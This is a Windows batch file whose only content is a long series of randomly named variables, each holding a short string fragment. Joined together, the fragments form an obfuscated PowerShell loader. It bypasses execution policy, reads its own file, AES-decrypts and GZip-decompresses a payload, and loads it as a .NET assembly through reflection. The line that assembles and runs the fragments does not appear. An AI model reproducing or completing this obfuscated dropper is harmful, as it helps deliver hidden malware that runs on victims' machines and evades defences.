@echo off
set "VqgGDcfhkV='[-1"
set "aGaKQOeeRg=$lAZ"
set "UitedgisnW=oin "
set "UhXFmfEvJV='oPV"
set "LVHwJpRSFY=-joi"
set "AJRYBakTAW=n ''"
set "EXYLGEZiKR== $i"
set "YQIsnkcJyG=.Cry"
set "DikzTfOMRD=);$i"
set "YijPNuVASH=-Obj"
set "xxqrvGjQaM=se()"
set "rqNQbmPAUy=ion."
set "AmvsvmPAnt=Secu"
set "NVcpEwkeUJ=HO3I"
set "nvgzMKbDTq=[]] "
set "jqIKjzCxAw=-4] "
set "oBTWFAMAFe=m.IO"
set "aCLtihTPJr=oryS"
set "yQMHnFycyf=ptor"
set "LuMVOrCpUG==');"
set "MfsMtlNAXE='txe"
set "ohfouHKxRu=sion"
set "AOgsIMNPVN=[Env"
set "aJbHgoRKuv=yTo("
set "vfvhAxZNsG=Mode"
set "eUILLoSbXA=null"
set "YwaxHaqWFe=ose("
set "efjeLSsmOl=VdJ."
set "WQkRbAIVqm=trea"
set "diSsTvUIwX=pStr"
set "tKNnCiGucu=bypa"
set "irXTPyqfBj=n ''"
set "QTWptPzwju=brea"
set "ecdGwpKGnE=.Cry"
set "rDqLzrERGw=ress"
set "LIKdtUWgDa=('%~f0'"
set "sBrWRnQRmM=V = "
set "QsfmfiQjur=stem"
set "KBFzqVXDGw=onve"
set "YhzbrlYgTk=rofi"
set "JvClffcrmn=e = "
set "ZpBTFyidId=ionM"
set "TCKpYkMJTB=.IO."
set "IgIqaLWmoG=$jAA"
set "vzfQhfcNav=m(, "
set "NEtFtixiAS=orF'"
set "YuHDQdalsL=TllA"
set "OQCgIvMtBr=).Sp"
set "yWOvmMbTAL=[Sys"
set "fvubsFZMou=, $k"
set "ORQBNvSTqR=ddin"
set "VJrshxybYp=.Dis"
set "UaqlydhxBj='gni"
set "pJXEMrmbuC=uuuh"
set "iAJqfsibDI=6] -"
set "gVBDqwwRxp=$PHo"
set "syRVybjwPQ=esaB"
set "QWwPAHLtyR=$kpJ"
set "gQBAwKqkNg===')"
set "gmYSIsTEFp=[-1."
set "IXTyyKhOIZ=comp"
set "zcQkCGOsCd=]::C"
set "QzaOlzAapU=oc.T"
set "lHHhBymkun== [S"
set "NfzYbamJUf=Wyqo"
set "oVmLtAjDcW=ect "
set "xCdxAWyNnC=;$bF"
set "invZIVnqlU=.-16"
set "JjRoHMtNGf=t Sy"
set "NDFlhAUajQ=7;$i"
set "KCcABwQRgw=;$Qu"
set "xMFGcLKSlV=16] "
set "uKdsJAFipz=vert"
set "rVzvBjrEmw=th('"
set "xfMYuzvrzZ=AZdw"
set "ILWeNyyLko=dw.D"
set "oySXfbZJGd=();$"
set "NqKAAkuZVK=hy.A"
set "EzJJQSzihe=and "
set "KnxCVovAzU=urit"
set "KjhSGxIRIJ= New"
set "mCvszKxCCc=BRJ "
set "DCRGvQpaYV=Fina"
set "ohhIOewoai=ach "
set "jUtlCXqFBa=yste"
set "Jwwctzdngh=)($k"
set "rZsVlwClzp=;$fl"
set "OjOCOoXPNS=.Len"
set "KobYymYGRc=kpJU"
set "XcKlapIhnq=w = "
set "wXzWlVikoV=fore"
set "UFmTUfsFFD=('da"
set "egScTjXUkk=;$jA"
set "sBmhBSPnrG=ert]"
set "MUYAVztytK=8kuY"
set "jPbOxoLjJw=Star"
set "YLaNrzrABd=U, 0"
set "DxfqBNlORY=aDNK"
set "QYjoByEWdL=Syst"
set "lETUqHfFOF=File"
set "fdNfyrnmGC=);$L"
set "AIJSGgAAcj=ing("
set "HLPJjAwVmc=$LdW"
set "KQJxLhpRdy=N.Pa"
set "TeECELmzOp=kyhK"
set "dMTHjEMiOe=ne);"
set "NqroAbavpL= [Sy"
set "cCRVNiaLUu=ct S"
set "aYDesbobsx=ck($"
set "aJHnxPwBbg=Comp"
set "SekXymTJgV=7kGw"
set "SPclhqrabM=lBlo"
set "jINrwkHzxj=-ep "
set "BRPjuZTqWC=CuSj"
set "mJUdHQFPmU=esMa"
set "FKWElKmEhj=morF"
set "WhWmhQgJkN=Ezxi"
set "ateXSiFqBS=z.En"
set "pQtiViWykn=$bFV"
set "NpZEpVbSpx=PKCS"
set "GhtVNuryel=lit("
set "QUKnRNoDpl= '')"
set "WclUbeDZni= '')"
set "pcMWZOsvDu=1] -"
set "vySoIprfOJ=join"
set "vaKMUtdXDN=qO.T"
set "DtgjddyXnQ=);$l"
set "egOnllGhKp=oc ="
set "ClclHKJgnM=am;$"
set "xoPYKQOkLx=ode]"
set "bCSWFqtvuu=yste"
set "fIBaJvbQxc=1..-"
set "NcaTnximQX=[IO."
set "otLIuwwwNs=form"
set "ODIEsiEwpF=SN.I"
set "GOXKFCAQwR=gMod"
set "nOTRXJdzPg=;$jA"
set "clhSxgBBYQ=)) {"
set "oWcOOtfPOo=dWoc"
set "LUWaXLgXyC=oint"
set "HQGwjXkORC=VRBR"
set "dMZwrtUYoV=$LdW"
set "kNlWUhbmMy=ss -"
set "tWREFOacqK=::De"
set "gtqTDSeIzF=.GZi"
set "hKWDzxXYaJ=::('"
set "mtpezVEkSe=in $"
set "pzpoQvsNFx=:: '"
set "oIKyRPeQnZ=ose("
set "tiHgUPmoxX=F'[-"
set "lyZHYkpTYw=);$i"
set "sxcVcwqPqk=uuh."
set "xrvpSYmUQu=inwS"
set "teeTYpuiEh=comm"
set "ymOgGksTYd=ew-O"
set "BoIAYlFSbU=pJUU"
set "TuVNWdPyik=nwSN"
set "NjxkxankCc=.Com"
set "gmOcCcdDei=New-"
set "qwXajVlZHT=tsWi"
set "HrLtzvlaGF=nwSN"
set "gsEZwTSNnD=Secu"
set "aLPBVQEuiV=($VR"
set "hCCmjFiGnN=raph"
set "HerHjBoqGk=UU ="
set "deFOsEIwRd=tS46"
set "CEtQnsdIqa=('%*'"
set "HTMYVGvLba= if "
set "VCZKOMXoIT=U = "
set "qNctIMLOje=x) {"
set "MKiTMrxkrz=.Con"
set "twWalIIcui=-nop"
set "CytjQfOHXu= = $"
set "WNwNOLAZxK=nage"
set "AHBYeDyirP= = ["
set "oZyWmAqBqM=.Cre"
set "tlCOVZrEFw=iron"
set "EQdQqeMBdd=rtS4"
set "bVcYEEpPpY=ment"
set "ZedAbxdHKu=k; }"
set "KUHHpbrHdL=ypto"
set "OyPVPLdBfc= [Sy"
set "juMZQpGUom=ix ="
set "shkVojOwRQ=saBm"
set "gJkddGdiPP=eam("
set "zvxjmQxTKX=ress"
set "eGKZepTFne=.Ass"
set "RCVnksPGqz=pJUU"
set "ImwCMfuhzr=m.IO"
set "CyBhLzrWvN=BRJ."
set "APzzeUqIjN=rity"
set "OJdOcTiVhw=-joi"
set "PBQUZHKaTo=raph"
set "gUEtVhMiCF=tem."
set "nqMFLqGfVF=.Mem"
set "lDCafjHJZT=flZY"
set "IJdGpqPsuK=.Key"
set "sXMWjYQpHI=daeR"
set "GKJElELtOa=rt]:"
set "rkHiDsrUWk=S46e"
set "TEIjHYmhEE=..-1"
set "luCdMOvQpN=($VR"
set "getzpPdiBu=e]::"
set "PUOZEYOENi= = $"
set "HNXUycoBLz=ptog"
set "ySCUhfweZh=Invo"
set "GqeNcRkEeg=]::("
set "aSrknOYfKr=bstr"
set "QZxhPJHJHx=Stre"
set "MznlChihvp=ateD"
set "KGaMcgoPpb=FcNh"
set "TgZDzABQlr=ct S"
set "fucBmkaeru=Ezxi"
set "EhHCRujgge=d;$i"
set "HkZvJMOuix=Disp"
set "shnNWERbHD=ispo"
set "gSglFutRTG=Bmor"
set "HtTYIcNraJ=ress"
set "cTvstYvWjD=-1.."
set "FSxuKYeHbQ=2VUN"
set "IZCMQZcSWD=.Cop"
set "WIcCPgmgAe='[-1"
set "GyJhnEbdot=[Sys"
set "vOSBaIaJCw=; };"
set "uTBhsaqPQK=[Sys"
set "QMXqHuavKY=oL'["
set "PAgWrcRtiY=..-1"
set "gLjchLQzOx=$kpJ"
set "nrpBwopGno=  $s"
set "MQOwSOowGE= = N"
set "LoUJRjiMUN=J = "
set "xyYAOvFvRU=6esa"
set "XhYgSrFVKy=();$"
set "SybJNanFOD=New-"
set "LdFKTJrkuN=flec"
set "BMIsuytHhJ=zm83"
set "WlBueNVRap=Obje"
set "SWOcUxtxTZ=m.Re"
set "DeMOeAPfnR=kpJU"
set "uEqbCiBQnc=nwSN"
set "jmAJWMRFac=ddin"
set "tTOsYywiiq=rity"
set "FbHDjNQcOv=] -j"
set "HvRaaDRutd=oc);"
set "IFzZjKYQWC=AqO "
set "jfbGfCjtFD=pher"
set "RFnSnzKXuF=y.Cr"
set "TTwjbvGQBl=('ev"
set "BTfgnwvKmV=.Dis"
set "WJANwuhnrg=oArr"
set "OjOuOxHfGM=R5jf"
set "BIoHasWzgK=gnir"
set "PVTKpmOKwK=Comp"
set "iyhFdLhYau=PHoi"
set "OCZOgUpsPs=pose"
set "bIRYiCLMmn=ke($"
set "QAOMcAzKii=);$Q"
set "kSOuiChHAB=bFVd"
set "LECdfDjQiT=ring"
set "urGoeSahsv=, (,"
set "RFnDdWXYAQ=em.I"
set "jOjtIvKqPx=ecry"
set "oQJvNudrMb=ptog"
set "pjQCIzjtWy='')("
set "HWyNXvEEZO=ewLi"
set "vOsMLMQfHi=yste"
set "ffeovDVDqR=grap"
set "BnVjkLlido=nwSN"
set "lWYOXulmZW=ZYz "
set "SPjANAdbYe=bjec"
set "OPTMDcHoZu=stem"
set "CycrAZKjxW=]::N"
set "DyCKZfSbth=nwSN"
set "BmrNgOYLWv=pres"
set "INoxPPODjB=)))"
set "MgZpoCJWoM=Conv"
set "vBIgCRxJpp=IoO3"
set "rdoHibrksv=join"
set "XdxoJluFIg=Disp"
set "caziOdAZWR=em.C"
set "sULvHpoeHr=]::("
